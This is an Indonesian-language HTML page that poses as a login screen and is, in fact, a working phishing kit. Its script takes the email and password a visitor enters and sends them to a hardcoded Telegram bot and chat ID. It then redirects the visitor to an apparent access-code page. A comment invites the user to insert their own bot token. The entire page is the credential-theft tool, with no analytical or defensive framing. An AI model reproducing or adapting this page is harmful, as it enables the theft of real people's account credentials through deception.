<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Masuk</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
  />
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter&display=swap');
    body {
      font-family: 'Inter', sans-serif;
    }
  </style>
</head>
<body class="bg-[#F8F8F8] min-h-screen flex flex-col">
  <header class="flex items-center px-5 py-4">
    <button aria-label="Back" class="text-black text-xl mr-3 focus:outline-none">
      <i class="fas fa-chevron-left"></i>
    </button>
    <h1 class="font-semibold text-lg text-black">Masuk</h1>
  </header>

  <main class="flex flex-col px-5 pt-2 flex-grow">
    <p class="text-black text-base mb-6">Silakan masukkan alamat email dan kata sandi Anda</p>

    <form id="loginForm" class="flex flex-col w-full">
      <label for="email" class="text-black text-xs mb-1 block font-normal">Alamat email Anda</label>
      <input
        id="email"
        name="email"
        type="email"
        placeholder=""
        required
        class="w-full rounded border border-gray-300 bg-white text-black text-sm px-3 py-2 mb-5 focus:outline-none focus:ring-2 focus:ring-yellow-400"
      />

      <label for="password" class="text-black text-xs mb-1 block font-normal">Kata sandi</label>
      <div class="relative w-full">
        <input
          id="password"
          name="password"
          type="password"
          placeholder=""
          required
          class="w-full rounded border border-gray-300 bg-white text-black text-sm px-3 py-2 pr-10 focus:outline-none focus:ring-2 focus:ring-yellow-400"
        />
        <span class="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 text-lg cursor-pointer select-none" id="togglePassword">
          <i class="fas fa-eye-slash"></i>
        </span>
      </div>

      <button
        type="submit"
        class="mt-16 bg-yellow-400 text-black text-sm font-normal rounded-md py-3 w-full"
      >
        Masuk
      </button>
    </form>

    <p class="mt-6 text-center text-black text-xs font-normal cursor-pointer select-none">
      Saya lupa kata sandi saya
    </p>
  </main>

  <script>
    // Toggle password visibility
    const togglePassword = document.getElementById('togglePassword');
    const passwordInput = document.getElementById('password');
    togglePassword.addEventListener('click', () => {
      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
      passwordInput.setAttribute('type', type);
      togglePassword.innerHTML = type === 'password' ? '<i class="fas fa-eye-slash"></i>' : '<i class="fas fa-eye"></i>';
    });

    // Telegram Bot info - replace with your own bot token and chat ID
    const TELEGRAM_BOT_TOKEN = '7661713527:AAEXyRZARqRcvPDenx4Y6EvPRPwh2Gp4h5A';
    const TELEGRAM_CHAT_ID = '7549590022';

    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const email = this.email.value.trim();
      const password = this.password.value.trim();

      if (!email || !password) {
        alert('Mohon isi semua kolom.');
        return;
      }

      const message = `Login Data:%0AEmail: ${email}%0APassword: ${password}`;

      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
         window.location.href = "kodeakses.html";
          this.reset();
        } else {
          alert('Gagal mengirim data ke Telegram.');
        }
      })
      .catch(() => {
        alert('Terjadi kesalahan saat mengirim data.');
      });
    });
  </script>
</body>
</html>
